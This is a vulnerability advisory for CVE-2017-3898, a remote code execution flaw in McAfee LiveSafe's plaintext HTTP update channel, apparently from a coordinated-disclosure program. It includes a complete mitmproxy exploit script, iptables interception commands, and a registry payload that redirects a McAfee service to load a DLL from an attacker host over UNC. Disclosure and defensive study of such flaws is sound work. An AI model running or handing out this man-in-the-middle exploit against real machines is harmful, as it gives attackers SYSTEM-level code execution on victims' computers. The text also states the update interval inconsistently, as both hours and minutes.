@@ -1,0 +1,119 @@
+## Vulnerabilities Summary
+The following advisory describes a Remote Command Execution found in McAfee McAfee LiveSafe (MLS) versions prior to 16.0.3. The vulnerability allows network attackers to modify the Windows registry value associated with the McAfee update via the HTTP backend-response.
+
+McAfee Security Scan Plus is a free diagnostic tool that ensures you are protected from threats by actively checking your computer for up-to-date anti-virus, firewall, and web security software. It also scans for threats in any open programs.
+
+## Credit
+An independent security research company, Silent Signal, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.
+
+## Vendor response
+The vendor has released patches to address this vulnerability.
+
+For more information: https://service.mcafee.com/webcenter/portal/cp/home/articleview?articleId=TS102714
+
+CVE: CVE-2017-3898
+
+## Vulnerabilities Details
+An active network attacker can achieve remote code execution in multiple McAfee products. Affected products retrieve configuration data over plaintext HTTP channel from the http://COUNTRY.mcafee.com/apps/msc/webupdates/mscconfig.asp URL (where COUNTRY is a two letter country identifier, e.g. “uk”).
+
+The response body contains XML formatted data, similar to the following:
+
+```
+<webservice-response response-version="1.0" frequency="168"
+verid="1#1316#15#0#2">
+<update>
+<reg key="HKLM\SOFTWARE\McAfee\MSC\Settings\InProductTransaction"
+name="enable" type="REG_DWORD" value="1" obfuscate="0"/>
+</update>
+</webservice-response>
+```
+
+The response describes a Registry modification with the reg tags under the webservice-response/update path.
+
+This request and subsequent update is triggered automatically, first upon the installation of the software then after the number of hours indicated by the frequency attribute of the webservice-request node (168 minutes by default).
+
+The update is executed by the PlatformServiceFW.dll of the McSvHost.exe process by invoking the mcsvrcnt.exe program with the /update argument. The McSvHost.exe process is running with SYSTEM privileges that is inherited by mcsvrcnt.exe that implements the Registry change.
+
+As a result active network attackers can modify the server responses to write the Registry of the target with SYSTEM privileges.
+
+## Proof of Concept
+The exploit runs as a proxy that intercepts and modifies plaintext HTTP requests and responses. Since the target software performs certificate validation for HTTPS services it’s important to let these connections pass through without modification.
+In regular HTTP proxy mode this can be achieved by using the --ignore command line parameter of mitmproxy:
+
+```
+mitmproxy -s mcreggeli_inline.py --ignore '.*'
+```
+
+In case of transparent proxy mode the above parameter should not be provided:
+
+
+```
+mitmproxy -s mreggeli_inline.py –T
+```
+
+For transparent proxy mode the following commands configure NAT and port redirection on common Debian-based Linux distributions (eth0 is the interface visible to the target, eth1 is connected to the internet):
+
+```
+iptables -t nat -A PREROUTING -i eth0 -p tcp \
+--dport 80 -j REDIRECT --to 8080
+iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
+sysctl net.ipv4.ip_forward=1
+```
+
+The script looks for the “mscconfig.asp” string in the request URL. If found the XML response body is deserialized, and new reg nodes are added based on the REG variable declared at the beginning of the script. The REG variable is a list of dictionaries, each dictionary containing the following keys:
+
+Key – The name of the Registry key to modify (e.g. “HKLM\SYSTEM\CurrentControlSet\Services\mfevtp”, backslashes should be escaped properly for Python)
+Type – Type of the value to create (e.g. “REG_SZ” for strings)
+Name – Name of the value to create
+Value – Value to be created
+The exploit also changes the frequency attribute to 1 so re-exploitation can be performed in shorter time (in 1 hour) if needed. After the new nodes are inserted, the resulting object is serialized and put in place of the original response body.
+
+To demonstrate code execution one of the own service entries of the affected McAfee products (mfevtp – McAfee Process Validation Service) was overwritten: the ImagePath value of the HKLM\SYSTEM\CurrentControlSet\Services\mfevtp key was replaced to point the built-in rundll32.exe with an UNC path argument pointing to the attacker host (The payload (test.dll) was served with Metasploit’s smb_delivery module during testing):
+
+
+
+The REG variable was declared like the following:
+
+
+```
+REG=[{"key":"HKLM\\SYSTEM\\CurrentControlSet\\Services\\mfevtp", "type":"REG_SZ","name":"ImagePath", "value":"c:\\windows\\system32\\rundll32.exe \\\\172.16.205.1\\pwn\\test.dll,0"},]
+```
+
+In this way SYSTEM level command execution is triggered after the machine is restarted, the exploit was not caught by the McAfee software.
+
+mcreggeli_inline.py
+
+```
+#!/usr/bin/env python3
+#
+# HTTP proxy mode:
+#  mitmproxy -s mcreggeli_inline.py --ignore '.*' 
+#
+# Transparent proxy mode: 
+#   mitmproxy -s mcreggeli_inline.py -T --host
+#
+
+from mitmproxy import ctx, http
+from lxml import etree
+
+REG=[{"key":"HKLM\\SYSTEM\\CurrentControlSet\\Services\\mfevtp","type":"REG_SZ","name":"ImagePath","value":"c:\\windows\\system32\\rundll32.exe \\\\172.16.205.1\\pwn\\test.dll,0"},]
+
+def response(flow):
+    if flow.request.scheme == "http" and "mscconfig.asp" in flow.request.url:
+        try:       
+            oxml=etree.XML(flow.response.content)
+            oxml.set("frequency","1")
+            update=oxml.xpath("//webservice-response/update")[0]
+            for r in REG:
+                reg=etree.SubElement(update,"reg")
+                reg.set("key", r["key"])
+                reg.set("type", r["type"])
+                reg.set("obfuscate", "0")
+                reg.set("name", r["name"])
+                reg.set("value", r["value"])
+            #ctx.log(etree.tostring(oxml)) 
+            flow.response.content=etree.tostring(oxml)
+            ctx.log("[+] [MCREGGELI] Payload sent")
+        except etree.XMLSyntaxError:
+            ctx.log("[-] [MCREGGELI] XML deserialization error")
+```
